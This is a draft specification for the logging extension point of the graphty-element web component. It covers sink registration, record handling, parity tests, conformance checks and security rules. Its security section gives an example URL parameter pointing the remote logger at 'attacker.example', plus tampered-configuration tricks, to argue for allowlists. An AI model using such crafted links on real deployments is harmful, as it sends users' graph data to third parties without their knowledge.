# Logging extension point

Status: draft specification against graphty-element 2.6.1. Shared rules are in `README.md`.

Normative files: `logging.d.ts`, `descriptors.schema.json#/$defs/LogSinkDescriptor`, and this
document.

## 1. What a log destination is

A log destination receives the element's log records: an in-page diagnostics panel, an error
tracker, a collector for a kiosk or headset where no console is visible, a test harness. A third
party brings one so that it can be turned on by NAME -- in a configuration object, a settings panel,
or a configuration stored and read back -- exactly as the element's own `remote` destination is,
rather than only by holding a live JavaScript object.

Two things are distinct and both are published:

- **A `Sink`** (from `./logging`): the live destination object with `write`, `flush`, `dispose`.
- **A registration** (from `./extend`): `registerLogSink({ descriptor, create })`, a factory filed
  under an id, so a configuration can name it.

Grounding: owner's list of official points (2026-09-21), which includes Logging (this corrects the
design-studio framework, which called the log destination internal); `design/graphty-element/extension-points.md`
section "Logging" (kept, with the correction in section 3 item 1).

## 2. Data model

| Type | Entry point | Kind |
| --- | --- | --- |
| `Sink`, `LogSinkDescriptor`, `LogSinkRegistration` | `./logging`, `./extend` | implemented by extensions |
| `LogRecord`, `LogLevel`, `formatLogRecord`, `LogSinkReference`, `GraphtyLogger` | `./logging` | called by extensions |

`LogSinkDescriptor` rules: `id` non-empty, not `console` or `remote`, permanent; `plainName`
non-empty; `description` a sentence; `options` an array (README section 7).

## 3. Registration and attachment

1. `registerLogSink(registration, options?)` files a FACTORY. It does NOT attach a destination and
   no record is delivered because of it. (The guide `docs/guide/extending/index.md` says a
   registered destination "starts receiving records immediately"; that statement is false and must
   be corrected.)
2. A registered destination is attached when a configuration names it:
   `GraphtyLogger.configure({ sinks: [{ use: "<id>", options }] })`. The element resolves `options`
   against `descriptor.options` (`E_UNKNOWN_OPTION`, `E_OPTION_RANGE`) and calls `create` with the
   result. An unregistered id is `E_UNKNOWN_SINK` with `details.available`.
3. A live object MAY be attached directly with `GraphtyLogger.addSink(sink)` or by putting it in
   `configure({ sinks: [sink] })`; a live object cannot be stored or named, which is why the
   registry exists. A configuration read from storage or parsed from JSON MUST be treated as
   references only (`{ use, options }`): an entry is a live sink only when it arrives through the
   in-memory API and its `write` is a function. **(not yet met)** `configure()` treats any entry
   with a `write` key as a live sink, so a stored configuration edited to hold
   `{ "name": "console", "write": 0 }` attaches an object whose every write throws and is
   swallowed, blinding the console without registering any code.
4. The element MUST attach a registered destination under `descriptor.id`, ignoring the `name` its
   factory returns. This is the element's duty, not the extension's: a factory MAY return any
   `name`, and a conformance check does not fail it for that. **(not yet met)** 2.6.1 attaches it under the returned name, so a factory can
   return `"console"` and silently replace the element's console destination (the reserved ids are
   bypassed), and a factory returning any other name makes one configuration attach two
   destinations.
5. Attaching a destination under a name already attached replaces it, and the replaced one's
   `dispose` is called.
6. `configure` MERGES: attaching a destination does not reset the level, the modules or other
   destinations.
7. Validation of `registerLogSink`, each an `E_BAD_COMMAND` with `details.kind: "sink"`: no
   descriptor (`field: "descriptor"`); empty id (`"id"`); `create` not a function (`"create"`).
   A built-in id is `E_DUPLICATE_PLUGIN`.

## 4. The destination's obligations

1. `write` MUST be synchronous and MUST NOT block: a network destination buffers in `write` and
   sends in `flush`, as the element's own remote destination does. A promise returned from `write`
   is ignored, so an `async write` that rejects becomes an unhandled rejection rather than a
   reported failure; `write` MUST NOT be `async`.
2. `write` MUST NOT mutate the record; the record and its `data` are frozen, and the same object is
   handed to every destination in turn.
3. `write` MUST NOT log through `GraphtyLogger` (a destination that logs about its own delivery
   recurses). It MAY use the browser console for its own failures.
4. `level` and `categories`, when set, narrow what the destination receives; they can never widen
   past the global level and module filter.
5. `dispose` MUST release every timer, socket and queue the destination created; it is called on
   removal and on replacement.
6. `flush`, when present, MUST settle (resolve or reject) in bounded time; a rejection is caught and
   reported and does not stop another destination's flush.

## 5. What the built-in destinations do, and parity

"Pinned by" names the test in `graphty-element/test/browser/extensions/logging-extension.test.ts`.

| Capability | Pinned by |
| --- | --- |
| Receives every record at every level, from every module | "receives every record the element emits...", "...from more than one of its modules" |
| Receives the whole record: time, level, category, message, data, the `Error` itself; TRACE distinct from DEBUG | the three "receives the whole record..." / "...failure itself..." / "sees a trace record..." tests |
| Lazy values computed before delivery | "receives an expensive value already computed..." |
| Renders a record as the console line | "renders a record into the same line the element prints..." |
| Honours the global level and modules, and its own level and categories | the four level and category tests |
| Attached and detached at run time, listed while attached, disposed on detach | "is attached and detached while the graph is running...", "is told to let go..." |
| Isolated from another destination's throw, edit or failed flush | "keeps receiving records when another destination throws...", "cannot be changed by a destination that tried to edit...", "flushes on demand..." |
| Can replace the console, and give it back | "takes the place of the element's console...", "gives the console back..." |
| Listed in the catalogue | "is offered by the session's catalogue beside the element's own two destinations" |
| Turned on by name, including from a stored configuration | "is turned on by a name in a configuration...", "...written to storage and read back" |
| Options defaulted, validated, refused when unknown or out of range | "is built with the options its descriptor declares...", "refuses an option..." |
| Unknown name refused; built-in id reserved | "is refused when a configuration names a destination nothing registered", "cannot take a name the element ships..." |

Parity statements:

1. Progress and cancellation are vacuous (a `write` is fire-and-forget).
2. A destination cannot take more than the global level allows, like the built-ins.
3. Records emitted before a destination is attached are not replayed, for built-ins too. A
   destination that needs the first records is configured by name before the element is created.
4. **(not yet met)** `configure()` re-attaches the console even after a consumer removed it, so
   "takes the place of the element's console" holds only until the next `configure`. Whether a
   removal should persist is an open behaviour question in
   `design/graphty-element/extension-points.md` ("Still open").
5. `./logging` and `./extend` are Node-safe; a destination can be tested with no element and no
   renderer (`graphty-element/test/logging/sink-extension.test.ts` pins that).

## 6. Versioning and compatibility

1. `Sink` and `LogSinkDescriptor` are implemented by extensions. `LogRecord` is called by
   extensions and MAY gain members in a minor release.
2. `LogLevel` values are part of the contract, including their numeric values (a stored
   configuration writes them).
3. Categories are informative: the element MAY add, rename or split categories in a minor release.
   A destination filtering on a category SHOULD tolerate that. Messages are not part of the
   contract.
4. A stored logging configuration names destinations by id; renaming a destination's id breaks
   every stored configuration.

## 7. Security

This is the extension point most likely to move graph data off the page.

1. `LogRecord.data` MAY contain graph content: node and edge ids, attribute values, labels,
   file names, URLs, query strings. The element does not redact it. A consumer handling sensitive
   graphs (intelligence, security, patient data) MUST treat enabling a destination that sends
   records off the page as a data-export decision.
2. A destination that sends records off the page MUST document where, and SHOULD offer an option
   that drops `data` and `error` stacks. The recommended descriptor fields for declaring this
   (`destinations`, `forwardsData`) are README open decision 13; with them a settings panel can show
   "sends to logs.example.com, including graph data" before a reader turns it on. Those fields are
   the author's CLAIM and nothing verifies them: the element hands every destination the full
   record. The same decision recommends an element-level redaction setting that applies to EVERY
   destination that sends records off the page -- the built-in `remote` destination first among
   them, since it is the one that already does -- and not only to third-party ones. Redaction is
   specified by field, because stripping `data` alone leaves graph content in the text: it
   covers `data`, `error.stack`, `error.cause`, `GraphtyError.details` (whose `available` and
   `candidates` lists echo ids and option values), and message text. For message text to be
   redactable, the element's own log sites MUST keep graph values (node ids, labels, URLs, option
   values) out of `message` and `error.message` and put them in `data` or `details`
   **(not yet met:** for example `DataSource` builds "Failed to fetch from <url>" with the full
   URL**)**. The page's Content-Security-Policy is a partial backstop only (README section 9.4).
3. Log records are not the reproducibility record. What an analysis ran, with which parameters and
   seed, is the run record and the methods text; a consumer MUST NOT rely on logs for it, and a
   destination MUST NOT be required for a result to be reproducible.
4. A logging configuration read from storage, or built from a page URL with `parseLoggingURLParams`
   (which reads `graphty-element-logging` and `graphty-element-remote-log`), can turn on only
   destinations already registered by code; it can never load code. But it CAN turn on the
   built-in `remote` destination with an arbitrary URL, which sends every record to that URL:
   a link carrying `?graphty-element-remote-log=https://attacker.example`, followed by an analyst,
   exfiltrates graph content without loading any code. Therefore:
   - No configuration document (style, recipe, annotation, view, project) may carry a logging
     configuration at all (README section 9.2 item 3).
   - The `remote` destination, and any destination whose descriptor declares egress, MUST NOT be
     enabled from stored or URL-derived configuration unless its origin is on an allowlist the
     embedder set in code (open decision 13).
   - `parseLoggingURLParams` MUST refuse to enable `remote` unless the embedder opted in.
     **(not yet met)** It only checks that the value is a valid URL.
   - The allowlist is not enough on its own: the SAME configuration also sets the global level
     and category filters, and would set the proposed redaction. A tampered stored configuration
     or a crafted link that lowers redaction to `"none"` and raises the level to TRACE sends every
     record, in full, to a destination the embedder legitimately allowed. Therefore redaction,
     and any level more verbose than the embedder's ceiling for egress destinations, MUST be
     settable from code only; a stored or URL-derived configuration that sets them is refused
     with `E_BAD_COMMAND` naming the member. The embedder lock of open decision 21 freezes the
     logger policy (allowlist, redaction, the most verbose level egress destinations receive).
   The element no longer reads the page URL by itself.
5. An option that is a credential (an API key, a DSN) is stored with the rest of the configuration
   and replayed; a destination MUST NOT take one as an option until a `secret` option type exists
   (README section 7 item 10).
6. A URL in any record the element emits (a load URL, a fetch failure) is written with its query
   string and user information removed, by the element-wide rule of README section 9.2 item 7.

## 8. Conformance checks

Run by `checkLogSink(registration, { options })` in the proposed kit. All run in Node.

| Check | Passes when |
| --- | --- |
| registers | `registerLogSink` accepts it; the catalogue lists the descriptor |
| descriptor is valid | validates against `#/$defs/LogSinkDescriptor`; id not reserved |
| registering attaches nothing | after registration and before configuration, `write` is never called |
| attaches by name | `configure({ sinks: [{ use: id }] })` attaches the destination, listed under the descriptor id whatever `name` the factory returned, and a record reaches it |
| options default and validate | defaults reach `create`; an undeclared or out-of-range option is refused |
| write is synchronous | `write` returns `undefined` (not a promise) for the kit's record set |
| does not mutate | the kit's frozen records are unchanged and no throw from a frozen write occurs |
| does not recurse | `write` emits no record through `GraphtyLogger` |
| survives a stored configuration | the configuration, serialised to JSON and read back, attaches it again |
| disposes cleanly | after `removeSink`, `dispose` was called and no timer it created is alive |
| flush settles | `flush`, when present, settles with the network unavailable before the kit's hang timeout |
| egress matches its claim | with network calls trapped (README section 9.4 item 2's list), a destination that declares `destinations` contacts only those origins, and one that declares none contacts nothing |
| no secret in the payload | loading a URL with a query token and running a test graph under the default redaction, no destination receives the token or any node id of the test graph in `message`, `data` or `error` (fails until section 7 item 2 is met) |

## 9. Worked example

A ring-buffer destination that keeps the last N records in the page, for an on-screen diagnostics
panel in a headset where there is no console, turned on by name:

```ts
import { registerLogSink } from "@graphty/graphty-element/extend";
import { GraphtyLogger, LogLevel, formatLogRecord, type LogRecord, type Sink } from "@graphty/graphty-element/logging";

registerLogSink({
    descriptor: {
        id: "acmexr-ring",
        plainName: "On-screen log",
        description: "Keeps the most recent records in memory for an in-headset panel.",
        options: [
            { name: "capacity", plainName: "Records kept", type: "integer", default: 200, min: 10, max: 10000 },
            { name: "withData", plainName: "Keep attached data", type: "boolean", default: false },
        ],
    },
    create: (options): Sink => {
        const capacity = options.capacity as number;   // the cast goes once typed options ship (README section 7 item 8)
        const lines: string[] = [];
        return {
            name: "acmexr-ring",
            level: LogLevel.INFO,
            write(record: LogRecord): void {
                const kept = options.withData === true ? record : { ...record, data: undefined };
                lines.push(formatLogRecord(kept));
                if (lines.length > capacity) lines.shift();
            },
            dispose(): void {
                lines.length = 0;
            },
        };
    },
});

await GraphtyLogger.configure({ sinks: [{ use: "acmexr-ring", options: { capacity: 500 } }] });
```

## 10. Known gaps

- The guide says a registered destination receives records immediately (section 3 item 1).
- A registered destination is attached under the name its factory returns, not its id, so it can
  replace `console` (section 3 item 4).
- A stored configuration entry with a `write` key is attached as a live sink (section 3 item 3).
- Stored or URL-derived configuration can enable `remote` with any URL (section 7 item 4).
- The element redacts nothing before a third-party destination sees a record (section 7 item 2).
- `configure()` re-attaches a removed console (section 5).
- No declaration of where a destination sends data (section 7; open decision 13).
- Element messages carry graph values and full URLs, so no redaction of `data` alone can keep
  them in the page (section 7 item 2).
- A stored or URL-derived configuration can change the level and filters of a destination the
  embedder allowed (section 7 item 4).

## 11. Who this serves

No design-studio persona or workflow names logging: its demand comes from third-party embedders and
from operational-security constraints.

| Need | Source |
| --- | --- |
| Diagnostics where no console is visible (headsets, kiosks, phones) | the element's XR support; `graphty-element/CLAUDE.md` |
| Data must not leave the analyst's machine unannounced | `design/designloom/personas/cybersecurity-analyst.yaml`, `design/designloom/personas/intelligence-analyst.yaml` |
| An embedder routing element diagnostics into its own error tracker | the architectural principle that a third party gets everything the graphty app gets (root `CLAUDE.md`) |
